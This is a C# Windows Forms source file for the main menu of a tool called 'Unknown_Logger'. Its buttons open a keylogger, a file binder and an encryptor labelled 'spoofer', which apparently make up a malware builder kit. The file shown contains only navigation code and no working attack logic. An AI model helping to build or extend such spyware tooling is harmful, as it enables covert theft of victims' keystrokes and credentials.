using System;
using UnknownLibrary;
using System.Windows.Forms;
using Unknown_Logger.Forms;

namespace Unknown_Logger
{
    public partial class HomeForm : MetroFramework.Forms.MetroForm
    {
        internal string GithubURL = "http://kanegovaert.cf/";
        public HomeForm()
        {
            InitializeComponent();
        }
        private void BTN_OpenKeyloggerForm_Click(object sender, EventArgs e)
        {
            Forms.KeyloggerForm keyloggerForm = new Forms.KeyloggerForm();
            keyloggerForm.Show();
        }

        private void LL_LinkToGithub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Unknown.OpenLink(GithubURL);
        }

        private void BTN_OpenFileBinderForm_Click(object sender, EventArgs e)
        {
            FileBinderForm fileBinderForm = new FileBinderForm();
            fileBinderForm.Show();
        }

        private void BTN_OpenSpooferForm_Click(object sender, EventArgs e)
        {
            EncryptForm encryptForm = new EncryptForm();
            encryptForm.Show();
        }
    }
}
